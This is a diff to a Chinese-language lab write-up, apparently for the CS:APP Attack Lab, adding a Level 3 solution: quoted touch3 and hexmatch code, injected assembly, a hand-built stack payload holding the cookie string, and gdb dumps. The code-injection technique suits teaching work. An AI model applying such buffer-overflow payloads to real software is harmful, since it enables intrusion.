@@ -39,7 +39,7 @@ Breakpoint 5, getbuf () at buf.c:16
 ```s
 # code12.s
 movq  $0x59b997fa, %rdi       
-movq  $0x5561dc98, %rsp 
+movq  $0x5561dc78, %rsp 
 retq
 ```
 
@@ -60,3 +60,79 @@ objdump -d code12.o > code12.d
 0x5561dc98:     0xc7    0xc4    0x78    0xdc    0x61    0x55    0xc3    0x00
 0x5561dca0:     0x90    0xdc    0x61    0x55    0x00    0x00    0x00    0x00
 ```
+
+## Level 3
+
+先梳理一下这个步骤实现的思路：
+
+第一步，逻辑上需要跳转到touch3函数中
+
+```c
+void touch3(char *sval)
+{
+    vlevel = 3; /* Part of validation protocol */
+    if (hexmatch(cookie, sval)) {
+        printf("Touch3!: You called touch3(\"%s\")\n", sval);
+        validate(3);
+    } else {
+        printf("Misfire: You called touch3(\"%s\")\n", sval);
+        fail(3);
+    }
+    exit(0);
+}
+```
+
+可以发现，`touch3()`函数需要传入一个字符串指针，并和cookie一起作为参数调用`hexmatch()`函数。因此我们再探究一下这个函数的内容：
+
+```c
+/* Compare string to hex represention of unsigned value */
+int hexmatch(unsigned val, char *sval)
+{
+    char cbuf[110];
+    /* Make position of check string unpredictable */
+    char *s = cbuf + random() % 100;
+    sprintf(s, "%.8x", val);
+    return strncmp(sval, s, 9) == 0;
+}
+```
+
+这个函数将我们的cookie作为val传入，并通过`sprinf()`转化为字符串存储在字符串指针`s`中，并和我们传入的字符串指针进行内容比较。
+
+因此通过倒推可以发现，我们需要把cookie值的字符串形式作为参数传入`touch3()`，作为实验成功的必要条件，在上一部分中已经完成。但是，这一部分调用`hexmatch()`函数后，`%rsp`的值会发生变化，因此需要将cookie的字符串表示值存储在无法被覆盖的内存区域。
+
+因此，我们需要做的工作有：
+1. 将注入代码起始地址、字符串、`touch3()`函数的入口地址都存放到内存中
+2. 将字符串起始地址写入`%rdi`中
+3. 修改`%rsp`的值
+4. 调用`retq`指令，跳转到`touch3()`函数，传入字符串的地址进行比较。汇编形式如下：
+
+```asm
+movq <ADDR_STR>, %rdi
+movq <ADDR_NEW_RSP>, %rsp
+retq
+```
+
+因此我们组织栈的内容如下：
+
+```bash
+0x5561dc78:     0xfa    0x18    0x40    0x00    0x00    0x00    0x00    0x00
+0x5561dc80:     0x35    0x39    0x62    0x39    0x39    0x37    0x66    0x61
+0x5561dc88:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
+0x5561dc90:     0x48    0xc7    0xc7    0x80    0xdc    0x61    0x55    0x48
+0x5561dc98:     0xc7    0xc4    0x78    0xdc    0x61    0x55    0xc3    0x00
+0x5561dca0:     0x90    0xdc    0x61    0x55    0x00    0x00    0x00    0x00
+```
+
+成功通过测试。在`0x401854`处设置断点，运行到断点位置时查看上述内存区域：
+
+```bash
+(gdb) x /48xb 0x5561dc78
+0x5561dc78:     0x00    0x60    0x58    0x55    0x00    0x00    0x00    0x00
+0x5561dc80:     0x35    0x39    0x62    0x39    0x39    0x37    0x66    0x61
+0x5561dc88:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
+0x5561dc90:     0x48    0xc7    0xc7    0x80    0xdc    0x61    0x55    0x48
+0x5561dc98:     0xc7    0xc4    0x78    0xdc    0x61    0x55    0xc3    0x00
+0x5561dca0:     0x90    0xdc    0x61    0x55    0x00    0x00    0x00    0x00
+```
+
+可以发现由于我们注入的`retq`指令调用后，栈指针向高地址移动后，原来的内容被覆盖了，因此实验讲义的advice提示我们要再三考虑存放cookie字符串的位置。
